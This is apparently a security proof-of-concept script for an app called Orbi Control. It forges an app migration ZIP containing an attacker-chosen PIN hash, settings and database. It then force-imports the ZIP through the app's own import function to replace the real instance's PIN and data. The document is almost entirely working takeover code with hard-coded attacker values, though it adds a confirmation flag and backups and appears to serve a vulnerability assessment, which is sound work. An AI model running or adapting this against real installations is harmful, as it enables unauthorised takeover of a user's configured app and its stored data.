#!/usr/bin/env python3
"""LIVE PoC 3 — replace a configured machine's move file / take over its data dir.

Use: python3 poc3_live_move_file_takeover.py --confirm [--pin NEW_PIN]

Operates on the machine's real data dir: stops-check, backups the data dir, builds
a move ZIP you fully control (your passphrase, your settings including a new PIN,
your orbi.db), and force-imports it with the app's real ``migrate.import_()``.
The result is the app's real PIN, settings and DB replaced — local control of the
configured instance. This is the "auto replace zip" version.
"""
import argparse
import json
import os
import sqlite3
import tempfile
import time
import zipfile
from pathlib import Path

from live_common import (backup, confirm_arg, data_arg, load_orbi,
                         orbi_arg, real_data_dir, require_confirm)

PASSPHRASE = "attacker-move-passphrase"
MARKER_MAC = "DE:AD:BE:EF:00:01"


def make_db(path: Path, marker: str):
    """A minimal but valid app DB with one attacker-chosen device row."""
    with sqlite3.connect(path) as c:
        c.execute("CREATE TABLE IF NOT EXISTS devices (mac TEXT PRIMARY KEY, name TEXT, profile_id TEXT, "
                  "ip TEXT, vendor TEXT, first_seen REAL, last_seen REAL, online INTEGER, blocked INTEGER)")
        c.execute("INSERT OR REPLACE INTO devices (mac, name) VALUES (?, ?)",
                  (marker, "attacker-controlled device"))
        c.execute("CREATE TABLE IF NOT EXISTS kv (key TEXT PRIMARY KEY, value TEXT)")


def main():
    ap = argparse.ArgumentParser()
    orbi_arg(ap)
    data_arg(ap)
    ap.add_argument("--pin", default="ATTACKER123", help="PIN the imported instance will use")
    ap.add_argument("--force", action="store_true",
                    help="also replace an existing data dir (backs it up first)")
    ap.add_argument("--out", help="also save the crafted move ZIP here")
    confirm_arg(ap, "replace the real data dir with an attacker-controlled move file")
    args = ap.parse_args()
    require_confirm(args)
    root = load_orbi(args)
    data_dir = real_data_dir(args, root)

    from orbi import auth, config, migrate, osdep
    config.DATA_DIR = data_dir
    config.SETTINGS_FILE = data_dir / "settings.json"

    if not osdep.single_instance(data_dir):
        raise SystemExit("[!] Orbi Control is running on this machine. Stop it first "
                         "(the app's import refuses while the data dir is locked).")
    osdep._impl._lock_fd.close()  # flock is per-fd: release our probe so import_() can lock it

    if (data_dir / "orbi.db").exists():
        backup(data_dir, "poc3")
        if not args.force:
            raise SystemExit("[!] data dir already has data; re-run with --force to replace it "
                             "(a backup was just made).")

    with tempfile.TemporaryDirectory(prefix="orbi-poc3-live-") as td:
        td = Path(td)
        new_hash = auth.hash_pin(args.pin)
        payload = {
            "settings": {"pin_hash": new_hash, "alert_new_devices": True,
                         "router_host": "192.168.1.1", "port": 8470},
            "secrets": {}, "sensitive": {}, "pin_guesses": {},
        }
        sealed = migrate.seal(json.dumps(payload).encode(), PASSPHRASE)
        manifest = {"format": migrate.FORMAT, "made": time.time(), "from": "linux",
                    "version": "0", "secrets": [], "unreadable_secrets": []}

        db = td / "orbi.db"
        make_db(db, MARKER_MAC)
        move = td / "attacker-move.zip"
        with zipfile.ZipFile(move, "w") as z:
            z.writestr("manifest.json", json.dumps(manifest))
            z.writestr("sealed.bin", sealed)
            z.write(db, "orbi.db")
        if args.out:
            Path(args.out).write_bytes(move.read_bytes())
            print(f"[*] crafted move file saved to {args.out}")

        res = migrate.import_(move, PASSPHRASE, data_dir=data_dir, force=True)
        print(f"[+] imported with manifest {res['format']} into {data_dir}")

    after = config.load()
    print(f"[+] real settings.json pin_hash now matches chosen PIN {args.pin!r}: "
          f"{after.get('pin_hash') == new_hash}")
    with sqlite3.connect(data_dir / "orbi.db") as c:
        rows = c.execute("SELECT mac, name FROM devices").fetchall()
    print(f"[+] real orbi.db devices: {rows}")
    assert after.get("pin_hash") == new_hash
    assert any(r[0] == MARKER_MAC for r in rows)
    print("[+] CONFIRMED: attacker PIN + DB are now the real configured app's state")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
